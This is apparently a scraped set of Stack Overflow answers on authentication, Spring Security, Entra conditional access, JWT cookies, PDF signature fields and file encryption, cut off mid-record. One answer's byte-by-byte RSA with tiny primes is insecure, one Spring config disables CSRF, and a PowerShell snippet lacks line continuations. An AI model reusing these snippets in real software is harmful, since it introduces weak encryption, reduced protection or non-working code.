        "body": "package your.plugin.package\nimport grails.cli.GrailsApplicationCommand\nimport org.springframework.beans.factory.annotation.Autowired\nclass CustomCommand implements GrailsApplicationCommand {\n    static final USAGE = \"Usage: grails custom-command [options]\"\n    static final COMMAND_NAME = 'custom-command'\n    @Autowired\n    YourService yourService // Assuming you have a service you want to use\n    @Override\n    String getName() {\n        COMMAND_NAME\n    }\n    @Override\n    String getDescription() {\n        \"This is a custom command example.\"\n    }\n    @Override\n    String getUsage() {\n        USAGE\n    }\n    @Override\n    boolean handle() {\n        // Add your custom logic here\n        yourService.doSomething()\n        println \"Executing custom command...\"\n        return true // Return true to indicate successful execution\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-04-11T00:29:07",
        "author": "Puneet Behl"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78286724/spring-auth-entry-point-not-overriding-abstracted-commence-method",
    "title": "Spring Auth entry point not overriding abstracted commence method",
    "question_id": 78286724,
    "posted_date": "2024-04-07T01:13:30",
    "answers": [
      {
        "answer_id": 78286729,
        "body": "package letterbookd.server.security;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.AuthenticationEntryPoint;\nimport org.springframework.stereotype.Component;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n@Component\npublic class JwtAuthEntryPoint implements AuthenticationEntryPoint {\n\t@Override\n\tpublic void commence(\n\t\t\tHttpServletRequest request,\n\t\t\tHttpServletResponse response,\n\t\t\tAuthenticationException authException) throws IOException, ServletException {\n\t\tresponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, authException.getMessage());\n\t\t\t}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-04-07T01:16:36",
        "author": "lhoogenraad"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78206699/how-to-secure-2-endpoints-in-spring-one-with-basic-auth-and-the-second-one-with",
    "title": "How to secure 2 endpoints in Spring, one with Basic Auth and the second one with OAuth?",
    "question_id": 78206699,
    "posted_date": "2024-03-22T09:53:57",
    "answers": [
      {
        "answer_id": 78206952,
        "body": "@Order(Ordered.HIGHEST_PRECEDENCE)\n@Bean\npublic SecurityFilterChain filterChainOauth2(HttpSecurity http) throws Exception {\n    http\n        .securityMatcher(\"/test1/**\")\n        .authorizeHttpRequests((authz) -> authz\n            .anyRequest().authenticated()\n        )\n        .oauth2Login((oauth2Login) -> oauth2Login\n\t\t\t.userInfoEndpoint((userInfo) -> userInfo\n\t\t\t\t.userAuthoritiesMapper(grantedAuthoritiesMapper())\n\t\t\t)\n\t\t);\n    return http.build();\n}\n@Bean\npublic SecurityFilterChain filterChainDefault(HttpSecurity http) throws Exception {\n    http\n        .authorizeHttpRequests((authz) -> authz\n            .requestMatchers(\"/test2/**\", \"/test3/**\").authenticated()\n            .anyRequest().permitAll()\n        )\n        .csrf().disable()\n        .httpBasic(withDefaults());\n    return http.build();\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-03-22T10:36:27",
        "author": "Mar-Z"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77545680/url-extraction-from-multiple-webpages",
    "title": "URL extraction from multiple webpages",
    "question_id": 77545680,
    "posted_date": "2023-11-24T16:12:08",
    "answers": [
      {
        "answer_id": 77546040,
        "body": "# Define the URLs to get\n$threatFeedUrls = @(\n    \"https://raw.githubusercontent.com/DandelionSprout/adfilt/master/Alternate%20versions%20Anti-Malware%20List/AntiMalwareHosts.txt\",\n    \"https://osint.digitalside.it/Threat-Intel/lists/latestdomains.txt\"\n)\n# Get all the raw files\n$Result = $threatFeedUrls | foreach {Irm -Uri $_ -UseBasicParsing}\n# Filter out comments and empty lines\n$OnlyInterestingLines = $Result -split \"`n\" | where {$_ -notmatch \"^(#|\\s|$)\" }\n# Remove 127.0.0.1 at the beginning of lines followed by any amount of whitespace, remove anything on the left side of a \":\" and remove up to two \"/\" when it matches, sort it and return only unique addresses\n$urlList = $OnlyInterestingLines -replace \"^127\\.0\\.0\\.1\\s*\" -replace \"^.*:/?/?\" | Sort-Object -Unique\n# Specify the output file path\n$outputFilePath = 'output250.txt'\n# Save the URLs to the output file\n$urlList | Out-File -FilePath $outputFilePath",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-11-24T18:13:33",
        "author": "An-dir"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77429247/struggling-to-create-a-powershell-script-to-deploy-a-conditional-access-policy-t",
    "title": "Struggling to create a PowerShell script to deploy a conditional access policy to block legacy authentication",
    "question_id": 77429247,
    "posted_date": "2023-11-06T01:57:24",
    "answers": [
      {
        "answer_id": 77429624,
        "body": "Connect-MgGraph -Scopes \"Policy.Read.All\",\n\"Policy.ReadWrite.ConditionalAccess\",\n\"Application.Read.All\"\n$conditions = @{\nApplications = @{\nincludeApplications = 'All'\n};\nUsers = @{\nincludeUsers = 'All'\n};\nClientAppTypes = @(\n'ExchangeActiveSync',\n'Other'\n);\n}\n\n$grantcontrols = @{\nBuiltInControls = @('Block');\nOperator = 'OR'\n}\n$name = \"Block Legacy Authentication All Apps\"\n$state = \"Disabled\"\n\nNew-MgIdentityConditionalAccessPolicy `\n-DisplayName $name\n-State $state\n-Conditions $conditions\n-GrantControls $grantcontrols",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2023-11-06T03:07:46",
        "author": "Rukmini"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77388877/mock-authentication-on-dev-profile",
    "title": "Mock Authentication on dev-profile",
    "question_id": 77388877,
    "posted_date": "2023-10-30T09:03:53",
    "answers": [
      {
        "answer_id": 77389734,
        "body": "override fun doFilterInternal(request: HttpServletRequest,\n                                  response: HttpServletResponse,\n                                  chain: FilterChain) {\n  val principal = JWTClaimsSet.Builder()\n                 .claim(\"sub\", sub)\n                 .claim(\"email\", email)\n                 .build();\n  val authentication = UsernamePasswordAuthenticationToken(principal, null, roles.map { SimpleGrantedAuthority(it) })\n        SecurityContextHolder.getContext().authentication = authentication\n  chain.doFilter(request, response)\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-30T11:01:48",
        "author": "KhaosTheory"
      },
      {
        "answer_id": 77396681,
        "body": "@SpringBootTest(classes = { SecurityConfig.class, MessageService.class })\nclass MessageServiceTests {\n\t@Autowired\n\tprivate SecuredService securedService;\n\n\t@Test\n\t@WithMockAuthentication(\"BAD_BOY\")\n\tvoid givenUserIsNotGrantedWithNice_whenCallNice_thenThrows() {\n\t\tassertThrows(Exception.class, () -> securedService.nice());\n\t}\n\t@Test\n\t@WithMockAuthentication(name = \"brice\", authorities = \"NICE\")\n\tvoid givenUserIsNice_whenCallNice_thenReturnsGreeting() {\n\t\tassertThat(securedService.nice()).isEqualTo(\"Dear brice, glad to see you!\");\n\t}\n\t@ParameterizedTest\n\t@AuthenticationSource(\n\t    @WithMockAuthentication(name = \"brice\", authorities = \"NICE\"),\n\t    @WithMockAuthentication(name = \"ch4mp\", authorities = { \"VERY_NICE\", \"AUTHOR\" }))\n\tvoid givenUserIsAuthenticated_whenCallHello_thenReturnsGreeting(@ParameterizedAuthentication Authentication auth) {\n\t\tassertThat(securedService.hello()).isEqualTo(\"Hello %s.\".formatted(auth.getName()));\n\t}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-31T10:14:35",
        "author": "ch4mp"
      },
      {
        "answer_id": 77396681,
        "body": "@Import(AuthenticationFactoriesTestConf.class) // when using spring-addons-oauth2-test but not spring-addons-starter-oidc\n// @AddonsWebmvcComponentTest // when using spring-addons-starter-oidc along with spring-addons-starter-oidc-test (already imports AuthenticationFactoriesTestConf for you)\n@SpringBootTest(classes = { SecurityConfig.class, MessageService.class })\nclass MessageServiceTests {\n\t@Autowired\n\tprivate SecuredService securedService;\n\t@Autowired\n\tWithJwt.AuthenticationFactory authFactory;\n\n\t@Test\n\t@WithJwt(\"igor.json\")\n\tvoid givenUserIsIgor_whenCallNice_thenThrows() {\n\t\tassertThrows(Exception.class, () -> securedService.nice());\n\t}\n\t@Test\n\t@WithJwt(\"brice.json\")\n\tvoid givenUserIsBrice_whenCallNice_thenReturnsGreeting() {\n\t\tassertThat(securedService.nice()).isEqualTo(\"Dear brice, glad to see you!\");\n\t}\n\t@ParameterizedTest\n\t@MethodSource(\"identities\")\n\tvoid givenUserIsAuthenticated_whenCallHello_thenReturnsGreeting(@ParameterizedAuthentication Authentication auth) {\n\t\tassertThat(securedService.hello()).isEqualTo(\"Hello %s.\".formatted(auth.getName()));\n\t}\n\tStream<AbstractAuthenticationToken> identities() {\n\t\treturn authFactory.authenticationsFrom(\"brice.json\", \"igor.json\");\n\t}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-31T10:14:35",
        "author": "ch4mp"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77356420/font-error-when-trying-to-decrypt-an-encrypted-docx-file",
    "title": "Font error when trying to decrypt an encrypted .docx file",
    "question_id": 77356420,
    "posted_date": "2023-10-24T23:13:57",
    "answers": [
      {
        "answer_id": 77357591,
        "body": "import random\nPREVIEW_LENGTH = 15\nBYTES_PADDING_SIZE = 2\ndef gcd(a, b):\n    while b != 0:\n        a, b = b, a % b\n    return a\ndef mod_inverse(a, m):\n    if gcd(a, m) != 1:\n        return None\n    u1, u2, u3 = 1, 0, a\n    v1, v2, v3 = 0, 1, m\n    while v3 != 0:\n        q = u3 // v3\n        v1, v2, v3, u1, u2, u3 = u1 - q * v1, u2 - q * v2, u3 - q * v3, v1, v2, v3\n    return u1 % m\ndef generate_keypair(p, q):\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    e = random.randrange(1, phi)\n    g = gcd(e, phi)\n    while g != 1:\n        e = random.randrange(1, phi)\n        g = gcd(e, phi)\n    d = mod_inverse(e, phi)\n    return (e, n), (d, n)\ndef encrypt(bytes, public_key):\n    e, n = public_key\n    print('Encrypting with public key', public_key)\n    print('Origin bytes', bytes[:PREVIEW_LENGTH])\n    # Encrypt each byte to an integer m^e mod n\n    cipher_integers = [pow(byte, e, n) for byte in bytes]\n    print('Cipher integers', cipher_integers[:PREVIEW_LENGTH])\n    # Convert integers to bytes and concatenate them\n    cipher_bytes = b''.join(int_to_bytes(char) for char in cipher_integers)\n    print('Cipher bytes',cipher_bytes[:PREVIEW_LENGTH])\n    return cipher_bytes\ndef decrypt(cipher_bytes, private_key):\n    d, n = private_key\n    print('Decrypting with private key', private_key)\n    print('Cipher bytes', cipher_bytes[:PREVIEW_LENGTH])\n    cipher_integers = [bytes_to_int(cipher_bytes[i:i + BYTES_PADDING_SIZE]) for i in range(0, len(cipher_bytes), BYTES_PADDING_SIZE)]\n    print('Cipher integers', cipher_integers[:PREVIEW_LENGTH])\n    decrypted_bytes = [pow(cipher_int, d, n) for cipher_int in cipher_integers]\n    decrypted_bytes = bytes(decrypted_bytes)\n    print('Origin bytes', decrypted_bytes[:PREVIEW_LENGTH])\n    return decrypted_bytes\ndef int_to_bytes(n, padding=BYTES_PADDING_SIZE):\n    # Convert an integer to its byte representation\n    return n.to_bytes(padding, byteorder='big')\ndef bytes_to_int(b):\n    # Convert bytes to integer\n    return int.from_bytes(b, byteorder='big')\ndef key_to_pem(e, n, d):\n    # Construct the PEM strings for public and private keys\n    public_key_pem = f\"-----BEGIN RSA PUBLIC KEY-----\\n{int_to_bytes(e).hex()}\\n{int_to_bytes(n).hex()}\\n-----END RSA PUBLIC KEY-----\\n\"\n    private_key_pem = f\"-----BEGIN RSA PRIVATE KEY-----\\n{int_to_bytes(n).hex()}\\n{int_to_bytes(d).hex()}\\n-----END RSA PRIVATE KEY-----\\n\"\n    return public_key_pem, private_key_pem\ndef pem_to_key(private_key_pem):\n    # Remove PEM header and footer\n    private_key_pem = private_key_pem.replace(\"-----BEGIN RSA PRIVATE KEY-----\", \"\").replace(\"-----END RSA PRIVATE KEY-----\", \"\").strip()\n    # Convert hex strings to integers\n    n_hex, d_hex = private_key_pem.split('\\n')\n    n = bytes_to_int(bytes.fromhex(n_hex))\n    d = bytes_to_int(bytes.fromhex(d_hex))\n    return d, n\ndef encrypt_file(filepath):\n    p = 61\n    q = 53\n    public_key, private_key = generate_keypair(p, q)\n    with open(filepath, \"rb\") as f:\n        bytes = f.read()\n\n    encrypted_data = encrypt(bytes, public_key)\n    encrypted_filepath = filepath + \".encrypted\"\n    with open(encrypted_filepath, \"wb\") as f:\n        f.write(encrypted_data)\n    print(\"File encrypted successfully.\")\n    _, private_key_pem = key_to_pem(public_key[0], public_key[1], private_key[0])\n    return encrypted_filepath, private_key_pem\ndef decrypt_file(filepath, private_key_pem):\n    private_key = pem_to_key(private_key_pem)\n    with open(filepath, \"rb\") as f:\n        encrypted_data = f.read()\n\n    decrypted_data = decrypt(encrypted_data, private_key)\n\n    # Create a decrypted file with a \".decrypted\" extension\n    decrypted_filepath = filepath.replace('.encrypted', '')  # Remove \".encrypted\" from the end of the file name\n    decrypted_filepath = 'decrypted_' + decrypted_filepath\n    with open(decrypted_filepath, \"wb\") as f:\n        f.write(decrypted_data)\n\n    print(\"File decrypted successfully.\")\n    return decrypted_filepath\ndef main():\n    sample_path = 'file-sample_1MB.docx'\n    # Download sample for testing purpose, comment this if you already have a file\n    # import requests\n    # url = \"https://file-examples.com/storage/fe805ba0cc65378da968c5c/2017/02/file-sample_1MB.docx\"\n    # response = requests.get(url)\n    # if response.status_code != 200:\n    #     raise Exception('Error')\n    # with open(sample_path, \"wb\") as f:\n    #     f.write(response.content)\n    encrypt_path, private_key_pem = encrypt_file(sample_path)\n    decrypt_path = decrypt_file(encrypt_path, private_key_pem)\nmain()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-25T03:58:11",
        "author": "Alfred Luu"
      },
      {
        "answer_id": 77357591,
        "body": "Encrypting with public key (1613, 3233)\nOrigin bytes b'PK\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\xa6c\\x10K\\x00'\nCipher integers [2730, 658, 3077, 2601, 497, 0, 220, 220, 220, 0, 2869, 2590, 1765, 658, 0]\nCipher bytes b'\\n\\xaa\\x02\\x92\\x0c\\x05\\n)\\x01\\xf1\\x00\\x00\\x00\\xdc\\x00'\nFile encrypted successfully.\nDecrypting with private key (677, 3233)\nCipher bytes b'\\n\\xaa\\x02\\x92\\x0c\\x05\\n)\\x01\\xf1\\x00\\x00\\x00\\xdc\\x00'\nCipher integers [2730, 658, 3077, 2601, 497, 0, 220, 220, 220, 0, 2869, 2590, 1765, 658, 0]\nOrigin bytes b'PK\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\xa6c\\x10K\\x00'\nFile decrypted successfully.",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-25T03:58:11",
        "author": "Alfred Luu"
      },
      {
        "answer_id": 77357591,
        "body": "from cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nimport os\nPREVIEW_LENGTH = 15\ndef encrypt(bytes, aes_key, iv):\n    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())\n    # Encrypt the large file with AES\n    encryptor = cipher.encryptor()\n    cipher_bytes = encryptor.update(bytes) + encryptor.finalize()\n    print('Encrypting with aes_key', aes_key)\n    print('Origin bytes', bytes[:PREVIEW_LENGTH])\n    print('Cipher bytes', cipher_bytes[:PREVIEW_LENGTH])\n    return cipher_bytes\ndef decrypt(cipher_bytes, aes_key, iv):\n    # Create an AES cipher object with the AES key and IV\n    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())\n    # Decrypt the encrypted file with AES\n    decryptor = cipher.decryptor()\n    decrypted_bytes = decryptor.update(cipher_bytes) + decryptor.finalize()\n    print('Decrypting with aes key', aes_key)\n    print('Cipher bytes', cipher_bytes[:PREVIEW_LENGTH])\n    print('Origin bytes', decrypted_bytes[:PREVIEW_LENGTH])\n    return decrypted_bytes\ndef generate_key():\n    # Generate a random 256-bit AES key\n    aes_key = os.urandom(32)\n    iv = os.urandom(16)\n    return aes_key, iv\ndef encrypt_file(filepath):\n    aes_key, iv = generate_key()\n    with open(filepath, \"rb\") as f:\n        bytes = f.read()\n\n    encrypted_data = encrypt(bytes, aes_key, iv)\n    encrypted_filepath = filepath + \".encrypted\"\n    with open(encrypted_filepath, \"wb\") as f:\n        f.write(encrypted_data)\n    print(\"File encrypted successfully.\")\n    return encrypted_filepath, aes_key, iv\ndef decrypt_file(filepath, aes_key, iv):\n    with open(filepath, \"rb\") as f:\n        encrypted_data = f.read()\n\n    decrypted_data = decrypt(encrypted_data, aes_key, iv)\n\n    # Create a decrypted file with a \".decrypted\" extension\n    decrypted_filepath = filepath.replace('.encrypted', '')  # Remove \".encrypted\" from the end of the file name\n    decrypted_filepath = 'decrypted_' + decrypted_filepath\n    with open(decrypted_filepath, \"wb\") as f:\n        f.write(decrypted_data)\n\n    print(\"File decrypted successfully.\")\n    return decrypted_filepath\ndef main():\n    sample_path = 'file-sample_1MB.docx'\n    # Download sample for testing purpose, comment this if you already have a file\n    # import requests\n    # url = \"https://file-examples.com/storage/fe805ba0cc65378da968c5c/2017/02/file-sample_1MB.docx\"\n    # response = requests.get(url)\n    # if response.status_code != 200:\n    #     raise Exception('Error')\n    # with open(sample_path, \"wb\") as f:\n    #     f.write(response.content)\n    encrypt_path, aes_key, iv = encrypt_file(sample_path)\n    decrypt_path = decrypt_file(encrypt_path, aes_key, iv)\nmain()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-25T03:58:11",
        "author": "Alfred Luu"
      },
      {
        "answer_id": 77357591,
        "body": "Encrypting with aes_key b\"\\xe1\\xea\\xbc~tP\\xab\\x00\\\\'Uf\\xe8\\x87|\\xdd\\xa0\\x965\\x0e\\x88\\n\\xb3\\xb4\\xb8\\xb4\\r\\xde\\x00c\\x0e\\xf9\"\nOrigin bytes b'PK\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\xa6c\\x10K\\x00'\nCipher bytes b'G\\xb9B\\xdeK\\xedG\\x9a\\xcd_-\\x9ebl\\x07'\nFile encrypted successfully.\nDecrypting with aes key b\"\\xe1\\xea\\xbc~tP\\xab\\x00\\\\'Uf\\xe8\\x87|\\xdd\\xa0\\x965\\x0e\\x88\\n\\xb3\\xb4\\xb8\\xb4\\r\\xde\\x00c\\x0e\\xf9\"\nCipher bytes b'G\\xb9B\\xdeK\\xedG\\x9a\\xcd_-\\x9ebl\\x07'\nOrigin bytes b'PK\\x03\\x04\\x14\\x00\\x08\\x08\\x08\\x00\\xa6c\\x10K\\x00'\nFile decrypted successfully.",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-10-25T03:58:11",
        "author": "Alfred Luu"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77021641/can-i-use-a-fdf-file-to-digitally-sign-a-file",
    "title": "can I use a fdf file to digitally sign a file",
    "question_id": 77021641,
    "posted_date": "2023-09-01T04:36:46",
    "answers": [
      {
        "answer_id": 77033768,
        "body": "%PDF-1.2\n1 0 obj <</Type/Catalog/Pages 2 0 R/AcroForm 3 0 R>> endobj\n2 0 obj <</Type/Pages/Count 1/Kids[3 0 R]>> endobj\n3 0 obj <</Type/Page/Parent 2 0 R/MediaBox[0 0 596 842]/Annots[4 0 R]/Contents 7 0 R\n/Resources<</Font<</F1<</BaseFont/Helvetica/Encoding/WinAnsiEncoding/Name/F1/Subtype/Type1/Type/Font>>>>>>>> endobj\n5 0 obj <</Fields[4 0 R]/SigFlags 1>> endobj\n4 0 obj <</AP<</N 6 0 R>>/F 4/FT/Sig/MK<<>>/P 3 0 R/Rect[106 801 256 833]/Subtype/Widget/T(Signature1)/Type/Annot>> endobj\n%       Here is the space for the digital signature field\n6 0 obj <</BBox[0 0 150 32]/Length 0/Resources<<>>/Subtype/Form/Type/XObject>>\nstream\nendstream\nendobj\n%      Here are the Page contents just a line and text as graphics around the signature field\n7 0 obj <</Length 107>>\nstream\nq 1 J 1 w 50 800 m 250 800 l .5 .5 .5 RG S\n0 0 1 rg BT /F1 12 Tf 1 0 0 1 50 802 Tm (Signature) Tj ET Q\nendstream\nendobj\nxref\ntrailer <</Root 1 0 R>>\n%%EOF",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-09-03T14:53:50",
        "author": "K J"
      },
      {
        "answer_id": 77033768,
        "body": "%PDF-1.4\n1 0 obj <</AcroForm 2 0 R/Pages 3 0 R/Type/Catalog>> endobj\n2 0 obj <</Annots[4 0 R]/Contents 5 0 R/DR<</Font<</Helv 6 0 R>>>>/Fields[4 0 R]/MediaBox[0 0 596 842]/Parent 3 0 R\n/Resources<</Font<</F0<</BaseFont/Helvetica/Encoding/WinAnsiEncoding/Name/F1/Subtype/Type1/Type/Font>>>>>>/SigFlags 3/Type/Page>> endobj\n3 0 obj <</Count 1/Kids[2 0 R]/Type/Pages>> endobj\n4 0 obj <</AP<</N 7 0 R>>/BS<</W 0>>/DA(0 g /Helv 11 Tf)/DV(Enter full name of above)/F 4/FT/Tx/M(D:2023)/MK<</BC[0 0 0]>>\n/P 2 0 R/Rect[106 780 256 799]/Subtype/Widget/T(Signed)/TU(Signed by)/Type/Annot/V(Enter full name of above)>> endobj\n5 0 obj <</Length 107>> stream\nq 1 J 1 w 50 800 m 250 800 l .5 .5 .5 RG S\n0 0 1 rg BT /F0 12 Tf 1 0 0 1 50 802 Tm (Signature) Tj ET Q\nendstream\nendobj\n6 0 obj <</BaseFont/Helvetica/Subtype/Type1/Type/Font>> endobj\n7 0 obj <</BBox[0 0 150 18]/Type/XObject/Length 113/Resources<</Font<</Helv 6 0 R>>>>/Subtype/Form>>\nstream\n/Tx BMC q 0 0 150 18 re W n BT 0 g 0 Tc 0 Tw 100 Tz 0 Tr/Helv 11 Tf 0 5 Td (Enter full name of above)Tj ET Q EMC\nendstream\nendobj\nxref\ntrailer <</Root 1 0 R>>\nstartxref\n%%EOF",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-09-03T14:53:50",
        "author": "K J"
      },
      {
        "answer_id": 77033768,
        "body": "%FDF-1.4\n%\u00e2\u00e3\u00cf\u00d3\n1 0 obj << /FDF << /Annots [2 0 R] /F (asignedproforma2.pdf) /Fields [<< /T (Signed) /V (Mr I. Squiggle \\(AKA Ink SQuId\\))\n>>] /UF (asignedproforma2.pdf) >> /Type /Catalog >> endobj\n2 0 obj << /AP << /N 3 0 R >> /C [1 0 0] /CreationDate (D:2023) /F 4 /IT /Stamp /M (D:2023) /Name /WetSign\n/NM (12345678-1234-1234-0123456789abcdef) /Page 0 /Rect [106 801 256 833] /Subj (Stamp) /Subtype /Stamp /T (TBA) /Type /Annot >> endobj\n3 0 obj << /BBox [0 0 150 36] /Length 30 /Resources << /XObject << /Im0 4 0 R >> >> /Subtype /Form /Type /XObject >>\nstream\nq 150 0 0 36 0 0 cm /Im0 Do Q\nendstream\nendobj\n4 0 obj << /BitsPerComponent 1 /ColorSpace /DeviceGray /Height 30 /Length 570 /Subtype /Image /Width 150 >>\nstream\n\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e3\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00c1\u00fc?\u00ff\u00ff\u00f0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff x\u00ff\u00ff\u00c0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00fc  \u00ff\u00ff\u20ac \u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f8  \u00ff\u00ff  \u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f0  \u00ff\u00fc  \u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0 \u00ff\u00f8 \u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0 \u00ff\u00f0\u00f0\u00ff\u00c7\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00fe\u00ff\u00f0\u00fe \u00ff\u0192\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00fe\u00ff\u00e0?\u00ff\u20ac\u00ff\u0192\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00fe\u00ff\u00c0\u00ff\u00e0\u0192\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00c0\u00ff\u00ff\u00e0\u0192\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00c1\u00ff\u00ff\u00c0\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00c1\u00ff\u00ff\u20ac\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f0\u00ff\u00ff\u00c1\u00ff\u00fe\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f0\u00ff\u00ff\u00c1\u00ff\u00f8\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f0\u00ff\u00ff\u00ff\u00c1\u00ff\u00e0\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00c0\u00ff\u20ac\u00ff\u00c1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u20ac\u00ff\u00ff\u00ff\u00ff\u00e0~ ?\u00ff\u00c0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00fe \u00ff\u00ff\u00ff\u00ff\u00e0p \u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00ff\u00f0 \u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00fc \u00ff\u00ff\u00ff\u00ff\u00f8 \u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f8 \u00ff\u00ff\u00ff\u00ff\u00f8 ?\u00ff\u00ff\u00e0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f8 ?\u00ff\u00ff\u00ff\u00ff\u00e0 \u00ff\u00ff\u00ff\u00f1\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00f8\u00ff\u00ff\u00ff\u00ff\u00ff\u00c0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00fc\u00ff\u00ff\u00ff\u00ff\u00ff\u00c0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00c0\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00e3\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\nendstream\nendobj\ntrailer\n<<\n/Root 1 0 R\n>>\n%%EOF",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-09-03T14:53:50",
        "author": "K J"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77009344/how-do-i-validate-jwt-sent-to-client-in-secure-httponly-cookie",
    "title": "How do I validate JWT sent to client in secure, httponly cookie?",
    "question_id": 77009344,
    "posted_date": "2023-08-30T11:16:26",
    "answers": [
      {
        "answer_id": 77010869,
        "body": "const signToken = id => {\n  return jwt.sign({ id }, process.env.JWT_SECRET_STRING, {\n    expiresIn: process.env.JWT_expires_in\n  });\n};\nconst createSendToken = (user, statusCode, res) => {\n  const token = signToken(user._id);\n  const cookieOptions = {\n    expires: new Date(\n      Date.now() + process.env.JWT_COOKIE_EXPIRES_IN\n    ),\n    httpOnly: true\n  };\n  if (process.env.NODE_ENV === 'production') {\n // cookie will only sent on an encrypted connection\n    cookieOptions.secure = true;\n  }\n  res.cookie('jwt', token, cookieOptions);",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-08-30T15:04:02",
        "author": "sherryyy"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76987545/how-can-security-can-be-ensured-in-this-case-by-supabase",
    "title": "How can security can be ensured in this case by Supabase?",
    "question_id": 76987545,
    "posted_date": "2023-08-27T10:28:12",
    "answers": [
      {
        "answer_id": 76990187,
